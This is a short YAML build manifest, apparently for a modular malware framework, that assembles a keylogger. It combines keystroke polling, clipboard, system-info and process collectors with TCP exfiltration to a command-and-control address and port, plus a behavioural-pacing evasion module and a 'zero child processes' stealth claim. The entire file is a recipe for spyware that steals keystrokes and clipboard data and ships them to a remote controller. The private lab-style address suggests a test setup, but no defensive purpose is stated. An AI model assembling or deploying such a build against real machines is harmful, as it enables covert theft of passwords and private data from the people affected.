name: keylogger
description: Keylogger with system info, clipboard, and keystroke capture — zero child processes

core:
  - core/emit_buffer

collectors:
  - collectors/system_info_api
  - collectors/processes
  - collectors/clipboard

keylogger: collectors/keylogger_poll

exfil: exfil/tcp_flush
arch: arch/keylogger

evasion:
  - evasion/behavioral_pacing

vars:
  C2_IP: "10.0.2.2"
  C2_PORT: "9001"
  FLUSH_INTERVAL_MS: "30000"
  BATCH_DURATION_MS: "30000"
